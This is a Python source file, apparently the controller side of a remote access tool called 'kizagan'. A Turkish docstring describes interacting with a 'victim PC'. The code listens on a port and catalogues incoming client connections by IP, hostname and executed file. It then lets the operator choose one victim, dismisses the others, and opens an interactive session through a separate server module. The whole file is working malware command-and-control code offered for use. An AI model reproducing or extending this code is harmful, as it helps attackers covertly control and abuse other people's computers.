"""
Burasi thread olacak.Baglanti ile etkilesime gecildiginde bile, burasi calismali.
Port dinlenir.Port'a gelecek herhangi bir baglanti objesi ve adresi ekrana verilecek ve
bir liste degiskeninde tutulacak.
Kullanici bir sekilde port dinlenmesini sonlandiricak.Bundan sonra kullanicidan bir input istenecek.
Input'a verilen deger ile, kullanicinin etkilesime gececegi baglanti belirlenecek.Belirlendikten
sonra, kullanici kurban pc ile etkilesime gececegi terminal acilir.
Hangi program olarak yer aldigi yazacak listingte.
"""

import socket
from module import kizagan_server
from colorama import init, Fore
from halo import Halo
import os
import sys

init()

connections = []
addrs = []


def listen_port(ip, port):
    index = 1    
    client_list = f"{Fore.LIGHTGREEN_EX}Current Clients\n---------------\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, port))
    s.listen()
    spinner = Halo(text=f"Listening clients on {ip}:{port} press CTRL+C to stop.", spinner="line", placement="right", color="green", text_color="green")
    spinner.start()
    while True:
        try:
            connection, addr = s.accept()
            connections.append(connection)
            addrs.append(addr)
            host_name_with_abs_path = connection.recv(1024).decode()
            delimiter = host_name_with_abs_path.split(":delimiter:")
            client_list = client_list + f"{Fore.GREEN}[{Fore.LIGHTGREEN_EX}{index}{Fore.GREEN}]CLIENT_IP:{addr[0]} CLIENT_PORT:{addr[1]} HOSTNAME:{delimiter[0]} EXECUTED_FILE:{delimiter[1]}\n"
            print(f"""
{Fore.LIGHTGREEN_EX}[ESTABLISHED]{Fore.BLUE}CLIENT_IP:{addr[0]} CLIENT_PORT:{addr[1]} HOSTNAME:{delimiter[0]} EXECUTEDFILE:{delimiter[1]}""")
            index = index + 1
            if os.name == "nt":
                sys.stdin.read()
        except KeyboardInterrupt:
            try:
                if connections == []:
                    print(f"\n{Fore.RED}[-]You don't have any established connections.")
                    return 0
                spinner.succeed("Listening stopped.")
                os.system("cls" if os.name == "nt" else "clear")
                print(client_list)
                try:
                    client_choice = int(input(f"{Fore.CYAN}Enter a client number to interact:"))
                    if client_choice >= index or client_choice < 1:
                        print(f"{Fore.RED}[-]Please enter a valid number.")
                        for i in range(0, (index - 1)):
                            connections[i].send("exit".encode())
                        return 0
                    client_choice = client_choice - 1
                    for i in range(0, (index - 1)):
                        if i == client_choice:
                            continue
                        else:
                            connections[i].send("exit".encode())
                except ValueError:
                    print(f"{Fore.RED}[-]Please enter a number.")
                    for i in range(0, (index - 1)):
                        connections[i].send("exit".encode())
                    return 0
            except KeyboardInterrupt:
                for i in range(0, (index - 1)):
                    connections[i].send("exit".encode())
                return 0
            server = kizagan_server.Server(connections[client_choice], addrs[client_choice], delimiter[0], delimiter[2])
            print(f"{Fore.LIGHTGREEN_EX}[!]Connected to {addrs[client_choice][0]}:{addrs[client_choice][1]}!")
            server.main()
            return 0
        